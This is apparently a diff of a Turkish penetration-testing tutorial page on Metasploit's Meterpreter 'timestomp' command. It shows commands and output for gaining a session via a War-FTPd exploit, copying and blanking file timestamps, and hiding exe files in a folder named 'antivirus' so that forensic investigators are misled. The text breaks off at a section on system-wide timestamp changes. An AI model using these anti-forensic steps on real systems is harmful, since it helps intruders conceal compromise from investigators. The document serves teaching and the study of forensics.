@@ -1,20 +1,19 @@
 ---
 draft: false
-
-title:  'MSF Timestomp'
-date: '2017-06-05T13:37:00+03:00'
+title: MSF Timestomp
+linkTitle: MSF Timestomp
+translationKey: msf-timestomp
+weight: 330
+date: 2017-06-05T13:37:00+03:00
 author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
-
-description:  "Herhangi bir sistemde pentest yapmak, o sistemle etkileşime girmeyi gerektirir. Gerçekleştirdiğiniz her işlemde, hedef sistemde izler bırakırsınız. Bu bıraktığınız izleri incelemek\_forensics\_araştırmacılarının dikkatini çeker. Dosyaların zaman damgaları bunlardan bir tanesidir. Bırakılan bu izleri temizlemek veya en azından karıştırmak için Meterpreter\_timestomp\_adı verilen bir komut sağlamaktadır." 
- 
-url:  /tr/msf-timestomp/
- 
+description: İz bırakmamanın en iyi yolu sisteme hiç dokunmamaktır. Bırakılan izleri temizlemek için timestomp komutunu kullanabilirsiniz.
+url: /tr/msf-timestomp/
 featured_image: /images/metasploit.jpg
 categories:
-    - 'Metasploit Framework'
+    - Metasploit Framework
 tags:
     - cybersecurity
-    - 'metasploit framework'
+    - metasploit framework
 ---
 ## TimeStomp Nedir?
 
@@ -25,6 +24,7 @@ Herhangi bir sistemde pentest yapmak, o sistemle etkileşime girmeyi gerektirir.
 Her dosyanın Windows için Modified, Accesed ve Changed olarak 3 farklı zaman kaydı tutulur. Bunlara baş harflerinden hareetle kısaca MAC zamanları diyebiliriz. Ağ kartının MAC adresi ile karıştırmayın.
 
 Windows içerisinde bir dosyanın MAC zamanlarına bakalım.
+
 ```bash
 File Path: C:\Documents and Settings\P0WN3D\My Documents\test.txt
 Created Date: 5/3/2009 2:30:08 AM
@@ -33,6 +33,7 @@ Last Modified: 5/3/2009 2:30:36 AM
 ```
 
 Yukarıda, `test.txt` isimli dosyanın zaman kayıtlarını görebiliriz. Şimdi, `warftpd_165_user` modülünü kullanarak bu sistemde `Meterpreter` oturum açtığımızı farz edelim.
+
 ```bash
 msf exploit(warftpd_165_user) > exploit
 
@@ -52,6 +53,7 @@ Loading extension priv...success.
 ```
 
 Meterpreter shell açıldıktan sonra `timestomp -h` komutu ile yardım bilgilerini görüntüleyebilirsiniz.
+
 ```bash
 meterpreter > timestomp -h
 
@@ -72,6 +74,7 @@ OPTIONS:
 ```
 
 Şimdi, yukarıda örneğini verdiğimiz `test.txt` dosyasının bulunduğu klasöre gidelim.
+
 ```bash
 meterpreter > pwd
 C:\Program Files\War-ftpd
@@ -96,6 +99,7 @@ Mode              Size  Type  Last modified                   Name
 ```
 
 Bulunduğumuz klasördeki `test.txt` dosyasının zaman bilgilerini `-v` seçeneği ile görüntüleyebilirsiniz.
+
 ```bash
 meterpreter > timestomp test.txt -v
 Modified      : Sun May 03 04:30:36 -0400 2009
@@ -107,6 +111,7 @@ Entry Modified: Sun May 03 04:31:44 -0400 2009
 Bu dosyayı sizin oluşturduğunuzu düşünün. Bunu değiştirmek isteyebilirsiniz. Şimdi bu zaman bilgilerini değiştirmeye çalışalım. Bunu yapmanın birinci yolu, sistemde bulunan başka bir dosyanın zaman bilgilerini, `test.txt` dosyasına kopyalakmatır.
 
 Örneğin, `cmd.exe` dosyasının zaman bilgilerini `test.txt` zaman bilgilerine kopyalayalım. Bunun için aşağıdaki komutu `-f` seçeneği ile yürütebilirsiniz.
+
 ```bash
 meterpreter > timestomp test.txt -f C:\\WINNT\\system32\\cmd.exe
 > Setting MACE attributes on test.txt from C:\WINNT\system32\cmd.exe
@@ -118,6 +123,7 @@ Entry Modified: Sun May 03 05:11:16 -0400 2009
 ```
 
 İşlem tamamlandı. Gerçekten kopyalanmış mı bakalım.
+
 ```bash
 File Path: C:\Documents and Settings\P0WN3D\My Documents\test.txt
 Created Date: 12/7/1999 7:00:00 AM
@@ -132,6 +138,7 @@ Dikkatli bir kullanıcıysanız, Windows komut satırından ve Linux komut satı
 Ayıca, `test.txt` dosyasının `accessed time` değerinin dosyanın bilgilerini kontrol ettiğimizden dolayı hemen yeni tarihe güncellendiğini de vurgulamak gerekir. Windows için zaman kayıtlarının ne kadar değişken ve önemli olduğunu vurgulamak yerinde olacaktır.
 
 Şimdi farklı bir teknik kullanalım. `timestomp` sunduğu `-b` seçeneği, zaman bilgilerini boş olarak ayarlamanıza yardımcı olur. Aşağıdaki örnekte, dosyanın mevcut durumu ve `timestomp test.txt -b` komutu sonrasındaki zaman bilgilerini görebilirsiniz.
+
 ```bash
 meterpreter > timestomp test.txt -v
 Modified      : Tue Dec 07 08:00:00 -0500 1999
@@ -149,6 +156,7 @@ Entry Modified: 2106-02-06 23:28:15 -0700
 ```
 
 Görüldüğü gibi dosyalar 2106 yılına ait zaman bilgilerini aldı. Bu görünüm Meterpreter komut satırından böyle iken bir de Windows içerisinde nasıl göründüğüne bakalım.
+
 ```bash
 File Path: C:\Documents and Settings\P0WN3D\My Documents\test.txt
 Created Date: 1/1/1601
@@ -156,11 +164,12 @@ Last Accessed: 5/3/2009 3:21:13 AM
 Last Modified: 1/1/1601
 ```
 
-Linux Meterpreter içerisinde 2106 yılı, Windows içinde 1601 oarak görülmektedir. Bu farkın sebebini <a href="http://en.wikipedia.org/wiki/1601#Notes">Ek bilgi</a> sayfasından inceleyebilirsiniz.
+Linux Meterpreter içerisinde 2106 yılı, Windows içinde 1601 oarak görülmektedir. Bu farkın sebebini [Ek bilgi](http://en.wikipedia.org/wiki/1601#Notes) sayfasından inceleyebilirsiniz.
 
 ## Başka Bir Örnek
 
 Şimdi, meterpreter komut satırımızdan Windows içerisine `WINNT\\antivirus\\` klasörü oluşturalım ve içerisine bir kaç dosya yükleyelim.
+
 ```bash
 meterpreter > cd C:\\WINNT
 meterpreter > mkdir antivirus
@@ -189,6 +198,7 @@ meterpreter > cd ..
 ```
 
 Artık Windows içerisine `antivirus` klasörünün içerisine yüklediğimiz 3 adet `exe` dosyamız var. Bunların zaman bilgilerine bakalım.
+
 ```bash
 meterpreter > timestomp antivirus\\servpw.exe -v
 Modified      : 2017-05-09 16:23:18 -0600
@@ -203,6 +213,7 @@ Entry Modified: 2017-05-09 16:23:20 -0600
 ```
 
 `timestomp` komutunun `-r` seçeneğini kullanarak tüm klasör içeriğindeki dosyaların zaman bilgilerini boşaltabilirsiniz.
+
 ```bash
 meterpreter > timestomp antivirus -r
 > Blanking directory MACE attributes on antivirus
@@ -220,6 +231,7 @@ Bunun yerine sistemin tamamının zaman bilgilerini değiştirmeyi düşünebili
 Bu durum, sisteme bir müdahale olduğunu açık olarak ortaya koymakla birlikte forensics** araştırmacılarının işini zorlaştıracaktır.
 
 ## Tüm Sistemin Zaman Bilgilerini Değiştirme
+
 ```bash
 meterpreter > pwd
 C:WINNT\antivirus
